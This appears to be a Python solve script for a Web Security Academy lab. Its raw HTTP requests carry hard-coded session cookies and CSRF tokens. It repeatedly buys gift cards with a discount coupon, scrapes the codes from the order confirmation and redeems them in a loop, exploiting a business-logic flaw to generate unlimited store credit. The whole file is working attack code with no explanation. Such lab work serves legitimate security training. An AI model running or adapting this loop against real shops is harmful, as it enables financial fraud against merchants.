from lib import *

add_giftcards = FartRequest("""
POST /cart HTTP/1.1
Host: 0aa9006503503275c061f4ed0052005e.web-security-academy.net
Cookie: session=b4qkQV3E8w9YgvJ8tOflQdeerviDyaV6
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

productId=2&redir=PRODUCT&quantity=20
""").to_request()

coupon = FartRequest("""
POST /cart/coupon HTTP/1.1
Host: 0aa9006503503275c061f4ed0052005e.web-security-academy.net
Cookie: session=b4qkQV3E8w9YgvJ8tOflQdeerviDyaV6
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

csrf=M1zgGRSSqCfn88VjJskpronhwEDZq5Fw&coupon=SIGNUP30
""").to_request()

checkout = FartRequest("""
POST /cart/checkout HTTP/1.1
Host: 0aa9006503503275c061f4ed0052005e.web-security-academy.net
Cookie: session=b4qkQV3E8w9YgvJ8tOflQdeerviDyaV6
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

csrf=M1zgGRSSqCfn88VjJskpronhwEDZq5Fw
""").to_request()

get_gift_codes = FartRequest("""
GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
Host: 0aa9006503503275c061f4ed0052005e.web-security-academy.net
Cookie: session=b4qkQV3E8w9YgvJ8tOflQdeerviDyaV6
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

""").to_request()

redeem_gift_code = FartRequest("""
POST /gift-card HTTP/1.1
Host: 0aa9006503503275c061f4ed0052005e.web-security-academy.net
Cookie: session=b4qkQV3E8w9YgvJ8tOflQdeerviDyaV6
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006503503275c061f4ed0052005e.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

csrf=M1zgGRSSqCfn88VjJskpronhwEDZq5Fw&gift-card=gift_code
""")

s = requests.Session()


def execute_round():
    s.send(add_giftcards)
    s.send(coupon)
    s.send(checkout)
    out = s.send(get_gift_codes).text
    out = out[out.index("You have bought the following gift cards:"):]
    items = [x for x in out.split("<td>") if "</td>" in x]
    items = [x.split("</td>")[0] for x in items]
    print("Gift codes:", items)
    HttpWorker(redeem_gift_code.substitute(gift_code=items)).run_wait()
    print("Round done")


for i in range(10):
    execute_round()
